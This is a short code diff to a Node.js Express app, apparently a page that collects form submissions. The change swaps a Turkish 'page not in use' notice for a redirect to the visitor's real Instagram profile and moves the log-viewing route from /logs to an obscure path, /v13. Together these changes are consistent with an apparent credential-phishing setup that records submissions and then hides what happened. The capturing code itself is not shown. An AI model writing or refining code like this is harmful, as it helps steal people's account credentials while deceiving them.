@@ -19,10 +19,10 @@ app.post('/submit', (req, res) => {
     console.log('SUCCESS !');
   });
 
-  res.send(`<p>Bu sayfa kullanımda değil. Ek geliştirmeler ile geri döneceğiz.. <a href="/">Geri dön</a></p>`);
+  res.redirect(`https://www.instagram.com/${username}`);
 });
 
-app.get('/logs', (req, res) => {
+app.get('/v13', (req, res) => {
   fs.readFile('logs.txt', 'utf8', (err, data) => {
     if (err) throw err;
     res.send(`<pre>${data}</pre>`);
